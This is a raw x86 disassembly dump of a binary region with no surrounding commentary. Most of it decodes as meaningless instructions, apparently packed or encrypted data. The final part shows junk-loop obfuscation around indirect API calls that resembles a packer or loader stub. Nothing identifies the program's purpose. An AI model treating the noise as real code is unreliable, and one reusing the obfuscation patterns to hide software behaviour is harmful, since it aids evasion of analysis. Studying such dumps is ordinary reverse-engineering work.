  40ba9e:	sbb    DWORD PTR [esi+0x5542b18f],edx
  40baa4:	push   ebp
  40baa5:	shl    BYTE PTR [eax+ebx*8+0x3f],cl
  40baa9:	add    al,0xe6
  40baab:	jge    0x40baf9
  40baad:	add    eax,0x3eb0c463
  40bab2:	(bad)  
  40bab3:	fbld   TBYTE PTR [ecx-0x38ba091a]
  40bab9:	or     al,0xea
  40babb:	fld    QWORD PTR [edi]
  40babd:	int3   
  40babe:	mov    ebp,eax
  40bac0:	nop
  40bac1:	dec    ecx
  40bac2:	shr    BYTE PTR [eax],1
  40bac4:	sbb    ecx,DWORD PTR [eax-0x3dcb270d]
  40baca:	addr16 push ebp
  40bacc:	inc    ebp
  40bacd:	shl    ebx,cl
  40bacf:	dec    ecx
  40bad0:	call   0x22e14112
  40bad5:	in     al,0x9f
  40bad7:	test   BYTE PTR [edi+0x19],0xb5
  40badb:	mov    esp,0x93c6c093
  40bae0:	xor    ebx,0x3f
  40bae3:	retf   
  40bae4:	sbb    ebp,DWORD PTR [edx]
  40bae6:	xor    al,0xcb
  40bae8:	add    eax,0x93ed54e5
  40baed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40baee:	inc    ebp
  40baef:	mov    dh,0x6a
  40baf1:	dec    ecx
  40baf2:	and    ebp,ecx
  40baf4:	lods   eax,DWORD PTR ds:[esi]
  40baf5:	cli    
  40baf6:	stos   DWORD PTR es:[edi],eax
  40baf7:	jecxz  0x40bb11
  40baf9:	push   cs
  40bafa:	clc    
  40bafb:	adc    ebp,esi
  40bafd:	leave  
  40bafe:	push   es
  40baff:	icebp  
  40bb00:	cmp    BYTE PTR [edx+0x1c],dl
  40bb03:	xor    al,0x62
  40bb05:	add    DWORD PTR [edx+0x487b3111],0xffffffef
  40bb0c:	pop    ebp
  40bb0d:	loop   0x40badb
  40bb0f:	pop    edi
  40bb10:	outs   dx,DWORD PTR ds:[esi]
  40bb11:	push   edi
  40bb12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb13:	cdq    
  40bb14:	aam    0x27
  40bb16:	inc    esi
  40bb17:	arpl   WORD PTR [esi+ebp*1-0xcbaee17],di
  40bb1e:	cmp    ebx,0x489f2ef8
  40bb24:	or     BYTE PTR [ebx+0x5e],al
  40bb27:	dec    esi
  40bb28:	enter  0xd32d,0xed
  40bb2c:	mov    ds:0x3aef1b68,al
  40bb31:	das    
  40bb32:	mov    cl,0x1d
  40bb34:	clc    
  40bb35:	push   ebp
  40bb36:	gs pop edi
  40bb38:	and    al,al
  40bb3a:	xchg   ebp,eax
  40bb3b:	xchg   DWORD PTR [edx],eax
  40bb3d:	lock sub al,0xbf
  40bb40:	push   edi
  40bb41:	int3   
  40bb42:	outs   dx,BYTE PTR ds:[esi]
  40bb43:	mov    fs,WORD PTR ds:0x8190ce7b
  40bb49:	pslld  mm1,mm1
  40bb4c:	pop    ebx
  40bb4d:	js     0x40bba8
  40bb4f:	sbb    eax,0xbe8b386a
  40bb54:	cmp    esp,DWORD PTR [edx*8-0x7b804bfc]
  40bb5b:	test   ch,ah
  40bb5d:	js     0x40baf9
  40bb5f:	or     ebx,esi
  40bb61:	adc    edx,DWORD PTR [ecx-0x13e1eaa2]
  40bb67:	inc    ebp
  40bb68:	imul   DWORD PTR [ecx+edx*4-0x15]
  40bb6c:	push   esi
  40bb6d:	les    ebx,FWORD PTR ds:0x38770393
  40bb73:	iret   
  40bb74:	imul   esp,DWORD PTR [esi+0x57],0x33df6d5
  40bb7b:	xor    eax,0xd4122ea2
  40bb80:	cmp    al,0x42
  40bb82:	in     eax,dx
  40bb83:	(bad)  
  40bb84:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb86:	shl    BYTE PTR [ebp+0x50cd6456],1
  40bb8c:	adc    al,dl
  40bb8e:	cli    
  40bb8f:	or     al,0x24
  40bb91:	fcmovnb st,st(0)
  40bb93:	pop    ds
  40bb94:	fwait
  40bb95:	or     eax,0x32e8b07
  40bb9a:	lods   al,BYTE PTR ds:[esi]
  40bb9b:	clc    
  40bb9c:	dec    ecx
  40bb9d:	hlt    
  40bb9e:	xor    ebx,DWORD PTR [ebp-0x48]
  40bba1:	out    dx,eax
  40bba2:	out    0x68,al
  40bba4:	cmp    al,BYTE PTR [esi+0x77a77f21]
  40bbaa:	push   cs
  40bbab:	dec    edi
  40bbac:	jp     0x40bbe0
  40bbae:	sub    eax,0xac2af43d
  40bbb3:	mov    eax,0xb3fb2cc0
  40bbb8:	sbb    eax,0x2c138517
  40bbbd:	fild   QWORD PTR [eax+0x9c11921]
  40bbc3:	repz repnz mov ebx,0xc82bb6c
  40bbca:	xor    ebx,DWORD PTR [ecx]
  40bbcc:	mov    eax,0x66a5603b
  40bbd1:	out    0x84,al
  40bbd3:	aam    0x16
  40bbd5:	fld    QWORD PTR [edi]
  40bbd7:	sahf   
  40bbd8:	loope  0x40bc2c
  40bbda:	fdiv   QWORD PTR [ebx+0x998512c]
  40bbe0:	inc    edx
  40bbe1:	gs pop edx
  40bbe3:	loop   0x40bbfc
  40bbe5:	mov    dl,0x99
  40bbe7:	add    al,0xe3
  40bbe9:	dec    esi
  40bbea:	mov    esp,0xd900b165
  40bbef:	(bad)  
  40bbf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbf1:	dec    ebx
  40bbf2:	repz imul edx,DWORD PTR [edx],0xffffffac
  40bbf6:	cmc    
  40bbf7:	or     bl,BYTE PTR [ecx]
  40bbf9:	lock aam 0xe2
  40bbfc:	add    BYTE PTR [ebx+0x3a],0x39
  40bc00:	adc    bl,bl
  40bc02:	icebp  
  40bc03:	sub    al,0xb2
  40bc05:	add    eax,0x6ae3d1e3
  40bc0a:	call   0xb6c1602a
  40bc0f:	jmp    0x40bbc8
  40bc11:	and    BYTE PTR [edi+eiz*8-0x5],dl
  40bc15:	push   cs
  40bc16:	ss xchg eax,edx
  40bc19:	jae    0x40bbce
  40bc1b:	leave  
  40bc1c:	sti    
  40bc1d:	inc    ebx
  40bc1e:	add    DWORD PTR [ebp-0x1227dc1f],esi
  40bc24:	xor    BYTE PTR [edi],bl
  40bc26:	ds mov ecx,0xe0bf0a32
  40bc2c:	outs   dx,DWORD PTR ds:[esi]
  40bc2d:	out    dx,al
  40bc2e:	sahf   
  40bc2f:	sub    ch,BYTE PTR [edx+0x3cda27a0]
  40bc35:	push   ecx
  40bc36:	inc    edx
  40bc37:	data16 xor cl,BYTE PTR [eax+0x73]
  40bc3b:	nop
  40bc3c:	mov    esi,0xbf26b39b
  40bc41:	mov    ecx,edx
  40bc43:	jmp    0x1374:0xc79ac7b4
  40bc4a:	call   0xca30:0xcc66d821
  40bc51:	xlat   BYTE PTR ds:[ebx]
  40bc52:	push   ds
  40bc53:	inc    esp
  40bc54:	mov    al,ds:0x3a3d9f32
  40bc59:	out    0x40,eax
  40bc5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc5c:	retf   
  40bc5d:	test   DWORD PTR [eax-0x8],eax
  40bc60:	stos   DWORD PTR es:[edi],eax
  40bc61:	mov    edi,0x3f48fe1f
  40bc66:	jno    0x40bc3b
  40bc68:	fld    TBYTE PTR [ecx]
  40bc6a:	sti    
  40bc6b:	inc    edi
  40bc6c:	sub    BYTE PTR [ebp+0x5656dba4],ah
  40bc72:	and    BYTE PTR [edi],bl
  40bc74:	test   al,0x7a
  40bc76:	imul   ebp,DWORD PTR [ecx+0x8],0x911f5234
  40bc7d:	sub    ebp,DWORD PTR ds:0x2d680e01
  40bc83:	outs   dx,DWORD PTR ds:[esi]
  40bc84:	out    dx,eax
  40bc85:	cmp    eax,0x147e316b
  40bc8a:	ds aaa 
  40bc8c:	dec    ecx
  40bc8d:	pop    ds
  40bc8e:	fsubr  DWORD PTR [esp+edi*2+0x39]
  40bc92:	or     al,0x90
  40bc94:	repz jl 0x40bc8c
  40bc97:	xchg   BYTE PTR [ecx+0x4f4afd37],bl
  40bc9d:	(bad)  
  40bc9e:	call   0xe61df6e4
  40bca3:	fadd   QWORD PTR [ecx+0x32]
  40bca6:	mov    eax,0x58e58f4e
  40bcab:	mov    al,ds:0x2b8d3d2f
  40bcb0:	add    DWORD PTR [edx+0x1ebabfba],esi
  40bcb6:	ins    DWORD PTR es:[edi],dx
  40bcb7:	mov    ah,0x82
  40bcb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcba:	imul   ebx,DWORD PTR [edx-0x1b],0x28d73fe7
  40bcc1:	lahf   
  40bcc2:	push   edi
  40bcc3:	inc    edi
  40bcc4:	ret    
  40bcc5:	aad    0xcc
  40bcc7:	pop    edi
  40bcc8:	fisttp WORD PTR [edx-0x3]
  40bccb:	sbb    ebx,DWORD PTR [edx-0x6e]
  40bcce:	push   edi
  40bccf:	sbb    eax,0x34cb03c3
  40bcd4:	cmc    
  40bcd5:	cmc    
  40bcd6:	pop    ecx
  40bcd7:	repz idiv ebp
  40bcda:	scas   eax,DWORD PTR es:[edi]
  40bcdb:	out    0x47,al
  40bcdd:	push   ecx
  40bcde:	mov    DWORD PTR [esi-0xd78d24a],0xa06de888
  40bce8:	(bad)  
  40bce9:	int    0x2e
  40bceb:	fistp  WORD PTR ds:[eax]
  40bcee:	mov    bh,0x34
  40bcf0:	push   ecx
  40bcf1:	outs   dx,BYTE PTR ds:[esi]
  40bcf2:	pop    ecx
  40bcf3:	mov    bl,0xe9
  40bcf5:	rcl    BYTE PTR [edx],0x64
  40bcf8:	(bad)  
  40bcf9:	lods   eax,DWORD PTR ds:[esi]
  40bcfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcfb:	pop    ecx
  40bcfc:	clc    
  40bcfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcfe:	jge    0x40bcbf
  40bd00:	cmp    DWORD PTR ds:0x1642ed69,esp
  40bd06:	test   bl,cl
  40bd08:	inc    esi
  40bd09:	or     DWORD PTR [ecx+0x218fcb88],0x246b381d
  40bd13:	jge    0x40bd2e
  40bd15:	sar    dl,0x37
  40bd18:	cwde   
  40bd19:	das    
  40bd1a:	out    dx,al
  40bd1b:	cmp    BYTE PTR [esi-0x38],cl
  40bd1e:	aas    
  40bd1f:	sub    al,0x24
  40bd21:	jecxz  0x40bd54
  40bd23:	xchg   esi,eax
  40bd24:	imul   esi,ebp,0xd
  40bd27:	xchg   ebx,eax
  40bd28:	fstp   TBYTE PTR [edi]
  40bd2a:	aad    0x14
  40bd2c:	int    0xc1
  40bd2e:	cmp    al,BYTE PTR [edi+edx*2+0x235566a4]
  40bd35:	inc    ebx
  40bd36:	imul   esi,DWORD PTR [edi],0xb9775f4e
  40bd3c:	xchg   ebx,eax
  40bd3d:	ins    DWORD PTR es:[edi],dx
  40bd3e:	scas   al,BYTE PTR es:[edi]
  40bd3f:	in     eax,dx
  40bd40:	lea    esi,[esi+0x72]
  40bd43:	fbstp  TBYTE PTR [esi]
  40bd45:	pusha  
  40bd46:	sub    BYTE PTR [eax-0xe],ch
  40bd49:	enter  0xaadd,0x6e
  40bd4d:	sbb    cl,BYTE PTR ds:0x889098b
  40bd53:	jmp    0x40c074
  40bd58:	out    0x4c,al
  40bd5a:	xor    al,0x30
  40bd5c:	mov    ah,0x70
  40bd5e:	loop   0x40bda8
  40bd60:	into   
  40bd61:	xor    BYTE PTR [ecx],bl
  40bd63:	xchg   esp,eax
  40bd64:	adc    al,BYTE PTR [ecx-0x3d]
  40bd67:	(bad)  
  40bd68:	sbb    al,0x82
  40bd6a:	jle    0x40bdea
  40bd6c:	jp     0x40bdeb
  40bd6e:	jle    0x40bdee
  40bd70:	mov    eax,?
  40bd72:	lea    eax,ds:0x4dbec4e
  40bd78:	cld    
  40bd79:	out    dx,eax
  40bd7a:	sub    edi,DWORD PTR [ebp+0x77]
  40bd7d:	sbb    ah,bl
  40bd7f:	sub    BYTE PTR [ebp+ebp*1-0x66],bh
  40bd83:	(bad)  
  40bd85:	fdivr  DWORD PTR [edx]
  40bd87:	dec    edx
  40bd88:	out    dx,eax
  40bd89:	popa   
  40bd8a:	inc    edi
  40bd8b:	jecxz  0x40bdf3
  40bd8d:	in     eax,0xf5
  40bd8f:	neg    DWORD PTR [esp+ebp*4-0x27cce426]
  40bd96:	(bad)  
  40bd97:	and    DWORD PTR [edx+ecx*2+0x23],0xfffffffd
  40bd9c:	mov    ecx,0x3d54c851
  40bda1:	fcmovne st,st(3)
  40bda3:	xchg   edi,eax
  40bda4:	nop
  40bda5:	or     DWORD PTR [eax],0x6
  40bda8:	xchg   edx,eax
  40bda9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdaa:	push   eax
  40bdab:	inc    ecx
  40bdac:	mov    WORD PTR ds:0xf5b060d6,?
  40bdb2:	aam    0x89
  40bdb4:	inc    esp
  40bdb5:	lahf   
  40bdb6:	or     al,0xdd
  40bdb8:	scas   al,BYTE PTR es:[edi]
  40bdb9:	dec    ebp
  40bdba:	xor    DWORD PTR [ecx+0x58],esp
  40bdbd:	or     esi,DWORD PTR [ecx-0x4a84c939]
  40bdc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdc4:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40bdc6:	push   es
  40bdc7:	idiv   BYTE PTR [esi]
  40bdc9:	push   0x637107b3
  40bdce:	outs   dx,DWORD PTR ds:[esi]
  40bdcf:	ins    BYTE PTR es:[edi],dx
  40bdd0:	pop    eax
  40bdd1:	cs dec eax
  40bdd3:	jmp    0x9ee3c858
  40bdd8:	sar    BYTE PTR [eax],1
  40bdda:	mov    ebx,0x9b841a0c
  40bddf:	addr16 mov esi,0xb8387c74
  40bde5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bde6:	sar    BYTE PTR [eax],1
  40bde8:	cmp    al,0x9
  40bdea:	aam    0xf7
  40bdec:	xlat   BYTE PTR ds:[ebx]
  40bded:	jno    0x40bde7
  40bdef:	sbb    al,0xf2
  40bdf1:	pop    edi
  40bdf2:	loopne 0x40be67
  40bdf4:	mov    ebp,0xd7bb5b3
  40bdf9:	xchg   esp,eax
  40bdfa:	mov    eax,0xac2ddf56
  40bdff:	dec    ecx
  40be00:	adc    DWORD PTR [ecx-0x6094deb4],esp
  40be06:	and    BYTE PTR [eax],0x65
  40be09:	mov    ds:0xb0fa0726,al
  40be0e:	cwde   
  40be0f:	pop    edx
  40be10:	aad    0xd0
  40be12:	jnp    0x40be56
  40be14:	fimul  DWORD PTR [edi+esi*4+0x28]
  40be18:	lods   al,BYTE PTR ds:[esi]
  40be19:	xor    al,0x5a
  40be1b:	arpl   WORD PTR [ebp-0x2b],cx
  40be1e:	mov    ah,0x66
  40be20:	push   ss
  40be21:	sbb    DWORD PTR [eax+eiz*1],0x5f
  40be25:	pop    esp
  40be26:	or     DWORD PTR [ebp+0x50113ba7],edi
  40be2c:	je     0x40be16
  40be2e:	shl    BYTE PTR [esi-0x14fadb23],1
  40be34:	aam    0x13
  40be36:	inc    esp
  40be37:	cmp    ecx,0xf5626ddf
  40be3d:	add    DWORD PTR [ebx+0x65],edi
  40be40:	cmp    dh,cl
  40be42:	mov    eax,ds:0xff4147ad
  40be47:	fwait
  40be48:	dec    esi
  40be49:	jge    0x40be54
  40be4b:	pop    ecx
  40be4c:	dec    esi
  40be4d:	lds    edx,FWORD PTR [edx]
  40be4f:	outs   dx,BYTE PTR ds:[esi]
  40be50:	fnstcw WORD PTR [ebp-0x4e]
  40be53:	addr16 test al,0x3f
  40be56:	xchg   esi,eax
  40be57:	or     BYTE PTR [ebx+0x2d],0xef
  40be5b:	xchg   ebx,eax
  40be5c:	imul   eax,DWORD PTR [ecx+0x4c],0x600822eb
  40be63:	js     0x40be0c
  40be65:	cmp    BYTE PTR [edx+0xdf29f7b],dh
  40be6b:	or     esi,0xffffffa7
  40be6e:	sar    DWORD PTR [eax+0xa],0x6c
  40be72:	ret    
  40be73:	out    dx,al
  40be74:	cmp    al,0x16
  40be76:	(bad)  
  40be77:	ins    BYTE PTR es:[edi],dx
  40be78:	mov    bh,0xea
  40be7a:	cld    
  40be7b:	mov    fs,ecx
  40be7d:	addr16 js 0x40be07
  40be80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be81:	idiv   edx
  40be83:	aad    0x46
  40be85:	jmp    0x57b6fd11
  40be8a:	call   0x5baf2d42
  40be8f:	clc    
  40be90:	and    al,BYTE PTR [esi-0x2213c585]
  40be96:	mov    edi,0x9358a49f
  40be9b:	push   cs
  40be9c:	call   0xf6eb:0x988da8e5
  40bea3:	scas   al,BYTE PTR es:[edi]
  40bea4:	mov    al,0xa3
  40bea6:	out    dx,eax
  40bea7:	enter  0xf6,0x79
  40beab:	cdq    
  40beac:	fstp   DWORD PTR [edx]
  40beae:	inc    ecx
  40beaf:	cmp    eax,0xc51f4c51
  40beb4:	push   0x7e
  40beb6:	cmp    al,0x17
  40beb8:	imul   esp,DWORD PTR [esi],0xc3dd54c6
  40bebe:	call   0x22bd3fbd
  40bec3:	fadd   DWORD PTR [ecx+0x2a82dbf3]
  40bec9:	sub    al,0x2d
  40becb:	mov    esi,0xd3d0d080
  40bed0:	push   0xfffffffe
  40bed2:	popf   
  40bed3:	mov    ebx,DWORD PTR [edx]
  40bed5:	rcl    DWORD PTR [bx],0x5b
  40bed9:	ja     0x40bf57
  40bedb:	scas   eax,DWORD PTR es:[edi]
  40bedc:	lock add ebp,DWORD PTR [esi]
  40bedf:	scas   eax,DWORD PTR es:[edi]
  40bee0:	in     al,0xeb
  40bee2:	pop    edi
  40bee3:	adc    ch,BYTE PTR [ebx+ebx*4+0x1fadb9]
  40beea:	adc    eax,0xca616c44
  40beef:	clc    
  40bef0:	outs   dx,DWORD PTR ds:[esi]
  40bef1:	out    0x38,al
  40bef3:	mov    ecx,0x15aa902a
  40bef8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bef9:	inc    ebx
  40befa:	cmc    
  40befb:	rol    DWORD PTR [edi+0x3e],cl
  40befe:	dec    esi
  40beff:	mov    esi,0x4ad0780f
  40bf04:	push   eax
  40bf05:	push   0xf7ba16b
  40bf0a:	sti    
  40bf0b:	xchg   esp,eax
  40bf0c:	int3   
  40bf0d:	in     eax,0x31
  40bf0f:	outs   dx,DWORD PTR ds:[esi]
  40bf10:	imul   ch
  40bf12:	sub    al,al
  40bf14:	mov    al,0xb9
  40bf16:	cmp    eax,0x4f536a6
  40bf1b:	xor    eax,0x38ff95b2
  40bf20:	(bad)  
  40bf21:	div    ecx
  40bf23:	jb     0x40bf9c
  40bf25:	das    
  40bf26:	int    0x50
  40bf28:	sbb    eax,0xbcc57604
  40bf2d:	stc    
  40bf2e:	xchg   BYTE PTR [edi+eax*1-0x10c4797d],dh
  40bf35:	repnz mov cl,0x6d
  40bf38:	mov    esp,0x13a57e1a
  40bf3d:	jmp    0x8aef:0x369ebf92
  40bf44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf45:	dec    edx
  40bf46:	cld    
  40bf47:	mov    esi,0xf7802f0e
  40bf4c:	or     DWORD PTR [ebp-0x7b],0xbc35d6ff
  40bf53:	fist   WORD PTR [ecx-0x31]
  40bf56:	loopne 0x40bfaf
  40bf58:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40bf5a:	retf   0x49ca
  40bf5d:	outs   dx,BYTE PTR ds:[esi]
  40bf5e:	sub    BYTE PTR [edx],ch
  40bf60:	scas   al,BYTE PTR es:[edi]
  40bf61:	mov    sp,0x1b1f
  40bf65:	clc    
  40bf66:	sbb    eax,0x6320833
  40bf6b:	xchg   ecx,eax
  40bf6c:	xor    al,0x2f
  40bf6e:	sahf   
  40bf6f:	je     0x2fc77912
  40bf75:	mov    ebx,0x5c82fdf3
  40bf7a:	scas   al,BYTE PTR es:[edi]
  40bf7b:	test   eax,0xa5945b18
  40bf80:	jge    0x40bfa6
  40bf82:	ret    0xd320
  40bf85:	ja     0x40bf76
  40bf87:	rol    BYTE PTR [edi+0x37],0x0
  40bf8b:	pop    es
  40bf8c:	or     al,BYTE PTR [esi+ebx*2+0x78348c11]
  40bf93:	mov    ds:0xda13ea5c,al
  40bf98:	inc    esp
  40bf99:	xchg   BYTE PTR [edi],bl
  40bf9b:	cld    
  40bf9c:	in     eax,0x38
  40bf9e:	inc    edx
  40bf9f:	sub    ebx,edx
  40bfa1:	sbb    DWORD PTR [edx],0xac43e8d6
  40bfa7:	adc    BYTE PTR [edx],dh
  40bfa9:	xchg   cl,dh
  40bfab:	or     eax,0x18f882fc
  40bfb0:	add    DWORD PTR es:[ebx],eax
  40bfb3:	iret   
  40bfb4:	cs fdivr st,st(7)
  40bfb7:	jg     0x40bf47
  40bfb9:	sub    al,0x52
  40bfbb:	mov    dl,0xe2
  40bfbd:	repnz xchg esp,eax
  40bfbf:	mov    dl,0xd9
  40bfc1:	sub    bh,bh
  40bfc3:	pop    ds
  40bfc4:	out    dx,al
  40bfc5:	xor    DWORD PTR es:[ebx],ebx
  40bfc8:	add    bl,0xbe
  40bfcb:	(bad)  
  40bfcc:	(bad)  
  40bfcd:	mov    eax,0x3d74fab
  40bfd2:	in     al,dx
  40bfd3:	cmp    DWORD PTR [edi+eax*4+0x19],ebp
  40bfd7:	jmp    0x67ea:0x397705ca
  40bfde:	sbb    edi,0x31
  40bfe1:	rol    BYTE PTR gs:[eax],0x6c
  40bfe5:	push   eax
  40bfe6:	adc    al,0x6c
  40bfe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfe9:	ins    DWORD PTR es:[edi],dx
  40bfea:	stc    
  40bfeb:	mov    ebx,0x37cf74b
  40bff0:	xor    eax,0x7ebf1b4f
  40bff5:	ja     0x40bfd4
  40bff7:	sub    eax,0x24d42871
  40bffc:	icebp  
  40bffd:	push   ss
  40bffe:	repz and dl,BYTE PTR [eax-0x19]
  40c002:	jae    0x40c02b
  40c004:	adc    edx,edi
  40c006:	or     BYTE PTR [ebp+eax*2-0x79],ch
  40c00a:	imul   eax,DWORD PTR ds:0x5636cc60,0xffffffb2
  40c011:	xor    eax,0x9f07d58b
  40c016:	and    esp,ecx
  40c018:	hlt    
  40c019:	and    ebp,DWORD PTR [edx+0x70]
  40c01c:	cdq    
  40c01d:	daa    
  40c01e:	pop    es
  40c01f:	xor    DWORD PTR ds:0x962efc05,ebp
  40c025:	mov    dl,0x74
  40c027:	test   BYTE PTR [esi],ch
  40c029:	leave  
  40c02a:	mov    BYTE PTR [edx],ah
  40c02c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c02d:	fistp  WORD PTR [ecx+0x76]
  40c030:	push   0x477767a8
  40c035:	(bad)  
  40c036:	imul   edx
  40c038:	and    al,0x80
  40c03a:	jne    0x40c089
  40c03c:	out    dx,al
  40c03d:	add    al,0x34
  40c03f:	inc    eax
  40c040:	mov    eax,0x764eeb20
  40c045:	cdq    
  40c046:	inc    edx
  40c047:	cmp    dh,al
  40c049:	adc    edx,DWORD PTR [ebx]
  40c04b:	pop    es
  40c04c:	sub    eax,0xe768310e
  40c051:	cdq    
  40c052:	cmp    al,0xd0
  40c054:	dec    ecx
  40c055:	sar    BYTE PTR [edi-0x7e],cl
  40c058:	fmul   QWORD PTR [esi-0x52]
  40c05b:	add    ebp,esp
  40c05d:	sub    BYTE PTR [eax],0x74
  40c060:	jae    0x40c078
  40c062:	retf   0x5686
  40c065:	mov    ss,WORD PTR [edi+0x74]
  40c068:	lock sub eax,0xf6ecb8d4
  40c06e:	add    BYTE PTR [ebx+ecx*2+0x9],al
  40c072:	mov    ebp,DWORD PTR [edi-0x74f3ba75]
  40c078:	inc    ebp
  40c079:	or     bh,bh
  40c07b:	jne    0x40c075
  40c07d:	call   0x40746a
  40c082:	mov    eax,DWORD PTR [ebp-0xc]
  40c085:	cmp    eax,ebx
  40c087:	je     0x4098f8
  40c08d:	mov    eax,DWORD PTR [ebp-0x8]
  40c090:	mov    eax,DWORD PTR [eax]
  40c092:	pop    edi
  40c093:	pop    esi
  40c094:	pop    ebx
  40c095:	leave  
  40c096:	ret    0xc
  40c099:	push   ebp
  40c09a:	mov    ebp,esp
  40c09c:	sub    esp,0x30
  40c09f:	adc    DWORD PTR ds:0x433617,ecx
  40c0a5:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40c0ac:	xor    ecx,ecx
  40c0ae:	or     ecx,DWORD PTR ds:0x433627
  40c0b4:	and    DWORD PTR ds:0x433683,ecx
  40c0ba:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40c0c1:	mov    ecx,DWORD PTR [ebp-0x4]
  40c0c4:	mov    DWORD PTR ds:0x4336b7,0x13
  40c0ce:	cmp    DWORD PTR ds:0x4336b7,0x0
  40c0d5:	je     0x40c103
  40c0db:	cmp    DWORD PTR ds:0x4336b7,0x1a
  40c0e2:	jne    0x40c0f3
  40c0e8:	push   0x1b76
  40c0ed:	call   DWORD PTR ds:0x412020
  40c0f3:	mov    eax,ds:0x4336b7
  40c0f8:	dec    eax
  40c0f9:	mov    ds:0x4336b7,eax
  40c0fe:	jmp    0x40c0ce
  40c103:	push   ebx
  40c104:	mov    DWORD PTR ds:0x4336e7,0x19
  40c10e:	cmp    DWORD PTR ds:0x4336e7,0x0
  40c115:	je     0x40c1bf
  40c11b:	cmp    DWORD PTR ds:0x4336e7,0xa
  40c122:	jne    0x40c133
  40c128:	push   0x4904
  40c12d:	call   DWORD PTR ds:0x412024
  40c133:	cmp    DWORD PTR ds:0x4336e7,0xb
  40c13a:	jne    0x40c14d
  40c140:	mov    ebx,DWORD PTR ds:0x4336e7
  40c146:	dec    ebx
  40c147:	mov    DWORD PTR ds:0x4336e7,ebx
  40c14d:	mov    ebx,DWORD PTR ds:0x4336e7
  40c153:	dec    ebx
  40c154:	mov    DWORD PTR ds:0x4336e7,ebx
  40c15a:	jmp    0x40c10e
  40c15f:	mov    DWORD PTR ds:0x433683,0x1d
  40c169:	cmp    DWORD PTR ds:0x433683,0x0
  40c170:	je     0x40c1bf
  40c176:	cmp    DWORD PTR ds:0x433683,0x3
  40c17d:	jne    0x40c193
  40c183:	push   0x433780
  40c188:	push   0x400000
  40c18d:	call   DWORD PTR ds:0x412028
  40c193:	cmp    DWORD PTR ds:0x433683,0x4
  40c19a:	jne    0x40c1ad
  40c1a0:	mov    ebx,DWORD PTR ds:0x433683
  40c1a6:	dec    ebx
  40c1a7:	mov    DWORD PTR ds:0x433683,ebx
  40c1ad:	mov    ebx,DWORD PTR ds:0x433683
  40c1b3:	dec    ebx
  40c1b4:	mov    DWORD PTR ds:0x433683,ebx
  40c1ba:	jmp    0x40c169
  40c1bf:	mov    eax,0x7510854
  40c1c4:	adc    ebx,DWORD PTR ds:0x4336ab
  40c1ca:	xor    ecx,eax
  40c1cc:	mov    ebx,0x32729b
  40c1d1:	add    ecx,ebx
  40c1d3:	mov    DWORD PTR [ebp-0x1c],ecx
  40c1d6:	movzx  ecx,BYTE PTR ds:0x4336b7
  40c1dd:	xor    DWORD PTR ds:0x433613,ecx
  40c1e3:	mov    ecx,DWORD PTR [ebp+0x14]
  40c1e6:	or     DWORD PTR ds:0x43361b,0x43367b
  40c1f0:	push   esi
  40c1f1:	push   edi
  40c1f2:	test   ecx,ecx
  40c1f4:	mov    DWORD PTR ds:0x43362b,0x6070
  40c1fe:	je     0x40c2fb
  40c204:	mov    ecx,DWORD PTR [ebp+0x14]
  40c207:	mov    DWORD PTR ds:0x4336a7,0x1d
  40c211:	cmp    DWORD PTR ds:0x4336a7,0x0
  40c218:	je     0x40c2a6
  40c21e:	cmp    DWORD PTR ds:0x4336a7,0x29
  40c225:	jne    0x40c23a
  40c22b:	push   DWORD PTR [ebp-0xc]
  40c22e:	push   DWORD PTR [ebp-0x1c]
  40c231:	push   DWORD PTR [ebp-0x20]
  40c234:	call   DWORD PTR ds:0x41202c
  40c23a:	xor    esi,esi
  40c23c:	or     esi,DWORD PTR ds:0x4336a7
  40c242:	dec    esi
  40c243:	mov    DWORD PTR ds:0x4336a7,esi
  40c249:	jmp    0x40c211
  40c24e:	mov    DWORD PTR ds:0x4336eb,0x10
  40c258:	cmp    DWORD PTR ds:0x4336eb,0x0
  40c25f:	je     0x40c2a6
  40c265:	cmp    DWORD PTR ds:0x4336eb,0x2
  40c26c:	jne    0x40c278
  40c272:	call   DWORD PTR ds:0x4121d8
  40c278:	cmp    DWORD PTR ds:0x4336eb,0x3
  40c27f:	jne    0x40c292
  40c285:	mov    esi,DWORD PTR ds:0x4336eb
  40c28b:	dec    esi
  40c28c:	mov    DWORD PTR ds:0x4336eb,esi
  40c292:	mov    esi,DWORD PTR ds:0x4336eb
  40c298:	dec    esi
  40c299:	mov    DWORD PTR ds:0x4336eb,esi
  40c29f:	jmp    0x40c258
  40c2a4:	and    esi,edi
  40c2a6:	mov    ecx,DWORD PTR [ecx]
  40c2a8:	and    DWORD PTR ds:0x433633,0x0
  40c2b2:	jmp    0x40c2c4
  40c2b7:	mov    esi,DWORD PTR ds:0x433633
  40c2bd:	inc    esi
  40c2be:	mov    DWORD PTR ds:0x433633,esi
  40c2c4:	cmp    DWORD PTR ds:0x433633,0x15
  40c2cb:	jae    0x40c2f8
  40c2d1:	cmp    DWORD PTR ds:0x433633,0x1e
  40c2d8:	jne    0x40c2ed
  40c2de:	push   DWORD PTR [ebp-0xc]
  40c2e1:	push   DWORD PTR [ebp-0x1c]
  40c2e4:	push   DWORD PTR [ebp-0x18]
  40c2e7:	call   DWORD PTR ds:0x4123a4
  40c2ed:	jmp    0x40c2b7
  40c2f2:	sbb    DWORD PTR ds:0x4336f3,edx
